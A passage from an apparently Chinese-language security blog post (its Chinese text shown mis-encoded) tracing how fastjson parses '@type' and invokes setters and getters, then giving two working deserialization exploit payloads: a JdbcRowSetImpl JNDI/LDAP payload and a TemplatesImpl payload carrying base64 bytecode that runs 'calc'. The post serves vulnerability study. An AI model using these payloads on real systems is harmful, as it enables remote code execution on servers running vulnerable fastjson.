lexer.skipWhitespace();</span><br><span class="line">    ch = lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch != <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect &#x27;:&#x27; at &quot;</span> + lexer.pos() + <span class="string">&quot;, name &quot;</span> + key);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„çš„ä»£ç åŒ¹é…åˆ°åŒå¼•å·åä¼šé€šè¿‡scanSymbolæ¥è·å–ä¸‹ä¸€ä¸ª<code>&quot;</code>ç›´æ¥çš„å­—ç¬¦ä¸²ï¼Œå³æˆ‘ä»¬çš„<code>@Type</code>å¦‚æœâ€ä¸‹ä¸€ä¸ªä¸æ˜¯:å°±æŠ›å‡ºå¼‚å¸¸ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png" class="" title="alt text"><br>ç»§ç»­å¾€ä¸‹è°ƒä¼šè°ƒåˆ°ä¸€ä¸ªåˆ¤æ–­æˆ‘ä»¬å¾—åˆ°çš„keyæ˜¯ä»€ä¹ˆçš„ifè¯­å¥ã€‚æˆ‘ä»¬çš„ifçš„@Typeæ‰€æœ‰è¿›å…¥ä¸Šå›¾çš„if<br>ä¸Šé¢çš„ifç»§ç»­è·å–<code>&quot;</code>ä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œå³å…¶ä¼šå¾—åˆ°@Typeçš„å€¼ä¹Ÿå°±æ˜¯å¾—åˆ°fastjson.Userã€‚<br>ç„¶åä¼šé€šè¿‡loadClassæ¥åŠ è½½ç±»ã€‚æˆ‘ä»¬æ­¥å…¥<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png" class="" title="alt text"><br>å¯ä»¥å‘ç°å…¶å…ˆå°è¯•ä»ç¼“å­˜ä¸­è·å–è¿™ä¸ªç±»ã€‚è·å–ä¸åˆ°å°±èµ°åˆ°å¦‚ä¸‹ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png" class="" title="alt text"><br>åŒ¹é…å¼€å¤´çš„<code>[</code>ä¸<code>L</code>å¼€å¤´<code>;</code>ç»“å°¾çš„å¦‚æœåŒ¹é…åˆ°å°±åˆ é™¤<code>[</code>å’Œ<code>L  ;</code><br>ä¸Šé¢çš„åœ°æ–¹ä¹‹åè¿˜ä¼šè¢«bypassåˆ©ç”¨<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png" class="" title="alt text"><br>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡Classloderæ¥åŠ è½½ç±»ï¼Œå¹¶ä¸”æŠŠç±»å†™å…¥åˆ°ç¼“å­˜mappingé‡Œäº†<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png" class="" title="alt text"><br>ä¹‹åæŸ¥çœ‹ä¸‹ä¸€ä¸ªæ˜¯å¦ä¸ºå³å¤§æ‹¬å·ï¼Œå³æ˜¯åˆ°å¤´äº†ã€‚å½“ç„¶æ²¡æœ‰ç»“æŸäºæ˜¯ä¼šè·³è¿‡ï¼Œ<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png" class="" title="alt text"><br>ç„¶åèµ°åˆ°å›¾ä¸Šçš„ä»£ç ï¼Œè¿™é‡Œä¼šè·å–ä¸€ä¸ªserializerå™¨ã€‚æˆ‘ä»¬æ­¥å…¥çœ‹ä¸€ä¸‹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png" class="" title="alt text"><br>å…¶å…ˆå°è¯•å†derializersè¿™ä¸ªMapé‡ŒæŸ¥æ‰¾æˆ‘ä»¬çš„Typeç±»ï¼Œå¦‚æœèƒ½æ‰¾åˆ°æ•´ä¸ªMapå°±ä¼šè¿”å›ååºåˆ—åŒ–å™¨ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/57.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°Mapé‡Œè¢«å†™å…¥äº†å¾ˆå¤šçš„ç‰¹å®šç±»å¯¹åº”çš„ååºåˆ—åŒ–å™¨<br>ä½†æ˜¯è¿™æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„æ‰€ä»¥å½“ç„¶æ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥è¿”å›ç©ºã€‚<br>äºæ˜¯å°±è·³åˆ°äº†å¦‚ä¸‹ä»£ç ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ¥è·å–ååºåˆ—åŒ–å™¨<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png" class="" title="alt text"><br>æˆ‘ä»¬æ­¥å…¥ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png" class="" title="alt text"><br>ä¹‹åä¼šè¿›å…¥ä¸€å †ifåˆ¤æ–­ï¼Œæˆ‘ä»¬éƒ½è¿›ä¸å»ä¸€è·¯æ­¥è¿‡ä¼šèµ°åˆ°getNameæ–¹æ³•<br>ä¹‹åå°±æ˜¯å¯¹æˆ‘ä»¬çš„ç±»åè¿›è¡Œä¸€ç³»åˆ—çš„åˆ¤æ–­ï¼Œåˆ¤æ–­è¿‡äº†å°±ä½¿ç”¨forNameæ¥åŠ è½½ï¼Œå½“ç„¶æˆ‘ä»¬è¿‡ä¸äº†ã€‚<br>æœ€åä¼šè¿›å…¥elseæ¥åˆ›å»ºååºåˆ—åŒ–å™¨ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png" class="" title="alt text"><br>æ­¥å…¥å‡½æ•°<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png" class="" title="alt text"><br>æˆ‘ä»¬æ­¥å…¥å‰é¢éƒ½æ˜¯ä¸€å¤§å †åˆ¤æ–­ä¸ç”¨ç®¡å¾€ä¸‹è°ƒä¼šæ„é€ info<br>ä¹‹ååˆæ˜¯ä¸€å †åˆ¤æ–­æˆ‘ä»¬ç»§ç»­èµ°ä¼šèµ°åˆ°å¦‚ä¸‹ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png" class="" title="alt text"><br>æ­¥å…¥æ”¹ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png" class="" title="alt text"><br>ä¸Šå›¾ä»£ç å°†ç±»çš„æ‰€æœ‰æ–¹æ³•åï¼Œå±æ€§åèµ‹å€¼ç»™äº†æ•°ç»„ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png" class="" title="alt text"><br>ä¹‹åä¼šèµ°åˆ°å¦‚ä¸Šçš„forå¾ªç¯æ¥å˜é‡æ–¹æ³•åã€‚å°±æ˜¯è¿‡æ»¤å‡ºsetterçš„ç±»ï¼Œè¿›è¡Œäº†ä¸€äº›åˆ¤æ–­å¦‚é•¿åº¦ï¼Œè¿”å›å€¼æ˜¯å¦ä¸ºç©ºï¼Œæ–¹æ³•æ˜¯å¦ä¸ºéé™æ€ï¼Œå¼€å¤´æ˜¯å¦ä¸ºsetï¼Œç¬¬å››ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºå¤§å†™ç­‰<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/36.png" class="" title="alt text"><br>è¿‡äº†å°±å°†å…¶åŠ åˆ°fieldlisté‡Œã€‚</p><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png" class="" title="alt text"><p>ä¹‹åè¿˜æœ‰å˜é‡æ‰€æœ‰filedï¼Œæ‰€æœ‰çš„getterã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å…¶éå†getterçš„é€»è¾‘<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png" class="" title="alt text"><br>å…¶ä»–çš„éƒ½å·®ä¸å¤šï¼Œä½†æ˜¯å…¶æœ‰ä¸€ä¸ªå¾ˆé‡è¦çš„å°±æ˜¯å…¶æ£€æµ‹äº†è¿”å›çš„å€¼çš„ç±»å‹ï¼Œè¦ä¸ºMapæˆ–è€…AtomicBooleanç­‰ã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png" class="" title="alt text"><br>è¿™ä¸‰ä¸ªéå†ç»“æŸåå°±è¿”å›æˆ‘ä»¬åˆ›å»ºçš„infoã€‚<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/37.png" class="" title="alt text"><br>æ­¥å‡ºä¹‹ååˆæ˜¯ä¸€å †æ£€æµ‹åƒå¦‚ä¸‹çš„æ£€æµ‹äº†æ˜¯å¦åªæœ‰getteræ–¹æ³•<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png" class="" title="alt text"><br>å½“ç„¶è¿‡ä¸äº†ã€‚æˆ‘ä»¬ç»§ç»­è°ƒä¼šå‘ç°ä¹Ÿæ²¡ä»€ä¹ˆä¸œè¥¿äº†ï¼Œå¯ä»¥ä¸€è·¯è°ƒå‡ºå»ã€‚å¦‚ä¸‹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.png" class="" title="alt text"><br>ä½†æ˜¯å¦‚æœå†ç»§ç»­è°ƒè¯•å°±ä¼šå‘ç°æˆ‘ä»¬è°ƒè¯•çš„å†…å®¹å†IDEAä¸æ˜¾ç¤ºäº†ã€‚è¿™ä¸ªæ˜¯ååºåˆ—åŒ–å™¨çš„åŸå› ã€‚</p><p>å¦‚æœæˆ‘ä»¬æƒ³ç»§ç»­è°ƒè¯•çœ‹åé¢çš„å†…å®¹å°±éœ€è¦æ¢åº”è¯¥ååºåˆ—åŒ–å™¨ã€‚å¦‚æœæˆ‘ä»¬èƒ½è¿›å…¥å¦‚ä¸‹ä»£ç å°†asmEnableæ”¹ä¸ºfalseå°±ä¼šè·å–åˆ°å¦ä¸€ä¸ªååºåˆ—åŒ–å™¨<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (FieldInfo fieldInfo : beanInfo.fields) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">            asmEnable = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä½¿å¾—fieldInfo.getOnlyä¸ºtrueï¼Œå³æˆ‘ä»¬è¦è·å¾—åº”è¯¥getterä½¿å…¶addåˆ°fieldsæ•°ç»„é‡Œ</p><p>æˆ‘ä»¬åªéœ€è¦å†Userå†™ä¸€ä¸ªgetMapå…¶è¿”å›å€¼ä¸ºmapå³å¯ã€‚å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> String haha;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Map <span class="title function_">getMap</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getHaha&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> map;<span class="comment">//ä¸ºäº†åœ¨æ„é€ infoæ˜¯è¢«è·å–</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;setAge&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘ä»¬åœ¨è°ƒè¯•å°±å¯ä»¥æ­£å¸¸è°ƒè¯•åé¢çš„å†…å®¹äº†<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/38.png" class="" title="alt text"><br>æˆ‘ä»¬æ­¥å…¥deserialzeï¼Œä¹‹åä¼šè¿›å…¥ä¸€å †ifåˆ¤æ–­å’Œèµ‹å€¼ï¼Œä¸é‡è¦æˆ‘ä»¬ä¸€è·¯è°ƒåˆ°å¦‚ä¸‹ä»£ç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/39.png" class="" title="alt text"><br>æˆ‘ä»¬çœ‹åˆ°å…¶é€šè¿‡äº†createInstanceæ¥åˆ›å»ºå®ä¾‹åŒ–ä¸€ä¸ªç±»ã€‚æˆ‘ä»¬æ­¥å…¥çœ‹ä¸€ä¸‹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/40.png" class="" title="alt text"><br>çœ‹ä¸Šé¢çš„ä»£ç å¯ä»¥çŸ¥é“å…¶å¯¹ç±»è¿›è¡Œäº†å®ä¾‹åŒ–ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¼šè§¦å‘æ„é€ æ–¹æ³•<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/41.png" class="" title="alt text"><br>ä¹‹åå†å¾€ä¸‹è°ƒæˆ‘ä»¬å°±å¯ä»¥å‘ç°å…¶é‡å†™äº†setValueæ–¹æ³•ã€‚æˆ‘ä»¬ç»§ç»­æ­¥å…¥<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/42.png" class="" title="alt text"><br>å¯ä»¥å‘ç°å…¶é€šè¿‡åå°„æ¥è°ƒç”¨setterã€‚</p><h2 id="æ€ä¹ˆè§¦å‘çš„getter"><a href="#æ€ä¹ˆè§¦å‘çš„getter" class="headerlink" title="æ€ä¹ˆè§¦å‘çš„getter"></a>æ€ä¹ˆè§¦å‘çš„getter</h2><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/43.png" class="" title="alt text"><p>è¿›å…¥toJSONå‰é¢éƒ½æ˜¯ä¸€äº›åˆ¤æ–­å’Œèµ‹å€¼ï¼Œè¿˜æœ‰å’Œparseç›¸ä¼¼çš„å®ä¾‹åŒ–ç­‰è¿‡ç¨‹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/44.png" class="" title="alt text"><br>æˆ‘ä»¬ç›´æ¥è·³åˆ°è§¦å‘ç‚¹<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/45.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/46.png" class="" title="alt text"><br>å…¶é€šè¿‡éå†mapæ¥è§¦å‘åinvokeæ¥è°ƒç”¨</p><h1 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h1><p>æ—¢ç„¶æ¯æ¬¡ååºåˆ—åŒ–ä¸€ä¸ªç±»æ—¶éƒ½ä¼šè§¦å‘setteré‚£ä¹ˆæˆ‘ä»¬ååºåˆ—åŒ–ä¸€ä¸ªsetterå¯ä»¥è§¦å‘å‘½ä»¤æ‰§è¡Œç­‰æ¶æ„è¡Œä¸ºçš„ç±»ï¼Œä¸å°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†å—?</p><p>ç›®å‰ç½‘ä¸Šä¸»è¦æœ‰å¯¹ä¸¤ç§ç±»çš„å‘½ä»¤æ‰§è¡Œ</p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>æˆ‘è¿™é‡Œæ„å»ºLdapæœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯JNDInjector.jarã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jdbcrowsetlmpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1/HHfKyiQrGd/CommonsCollections1/Exec/eyJjbWQiOiJjYWxjIn0=\&quot;, \&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>fastJsonååºåˆ—åŒ–çš„é“¾å­è¿˜æ˜¯å¾ˆçŸ­çš„ï¼Œæ˜¯æ¯”è¾ƒå¥½åˆ†æçš„ã€‚<br>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹JdbcRowSetImplçš„æºç <br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/47.png" class="" title="alt text"><br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/48.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å†connectä¸‹å­˜åœ¨ä¸€ä¸ªlookupï¼Œå…¶å‚æ•°å°±æ˜¯this.getdataSourceä¹Ÿå°±æ˜¯dataSourceçš„å€¼ã€‚è¿™ä¸ªæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚é‚£ä¹ˆå†è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨JNDIæ³¨å…¥</p><p>å†çœ‹ä¸€ä¸‹å“ªé‡Œè§¦å‘äº†è¿™ä¸ªconnectå¯ä»¥å‘ç°å†setAutoCommitä¸‹è§¦å‘äº†è¿™ä¸ªæ–¹æ³•ã€‚é‚£ä¹ˆä¸€åˆ‡éƒ½å¾ˆæ˜ç¡®äº†ã€‚</p><p>å°±æ˜¯é€šè¿‡fastJson-&gt;setAutoCommit-&gt;connect-&gt;var1.lookup(dataSoure)</p><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/49.png" class="" title="alt text"><p>æ³¨æ„<br><img src="/2024/10/17/fastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/50.png" class="" title="alt text"><br>å› ä¸ºautoCommitçš„å€¼ä¸ºbooleanå€¼æ‰€æœ‰å†æ„é€ çš„payloadä¸­è¦ç»™å…¶èµ‹å€¼ä¸ºtrueæˆ–è€…false</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Temp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADIANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtManNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACwBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAC0BAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABGFyZ3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABdAcALgEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAgACQcALwwAMAAxAQAEY2FsYwwAMgAzAQAJanNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACwAAAA4AAwAAABEABAASAA0AEwAMAAAADAABAAAADgANAA4AAAAPAAAABAABABAAAQARABIAAQAKAAAASQAAAAQAAAABsQAAAAIACwAAAAYAAQAAABcADAAAACoABAAAAAEADQAOAAAAAAABABMAFAABAAAAAQAVABYAAgAAAAEAFwAYAAMAAQARABkAAgAKAAAAPwAAAAMAAAABsQAAAAIACwAAAAYAAQAAABwADAAAACAAAwAAAAEADQAOAAAAAAABABMAFAABAAAAAQAaABsAAgAPAAAABAABABwACQAdAB4AAgAKAAAAQQACAAIAAAAJuwAFWbcABkyxAAAAAgALAAAACgACAAAAHwAIACAADAAAABYAAgAAAAkAHwAgAAAACAABACEADgABAA8AAAAEAAEAIgABACMAAAACACQ=\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;outputProperties\&quot;:&#123; &#125;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå¦‚ä¸Šä»£ç å°±ä¼šå¼¹å‡ºè®¡ç®—æœºã€‚<br>ä½†æ˜¯è¿™ä¸ªé“¾çš„å®ç”¨ä»·å€¼ä¸é«˜ï¼Œå› ä¸ºTemplatesImplå†…æœ‰å¾ˆå¤šç§æœ‰ç±»ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨å…¶æ¥åŠ è½½å­—èŠ‚ç å°±é¿ä¸å¼€ï¼Œè¦ç»™è¿™äº›ç§æœ‰ç±»èµ‹å€¼ï¼Œè€Œå¦‚æœæƒ³ä½¿ç”¨parseObjectç»™ç§æœ‰ç±»èµ‹å€¼éœ€è¦å†å‡½æ•°å†…ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•°Feature.SupportNonPublicFieldï¼Œå¯å‡ 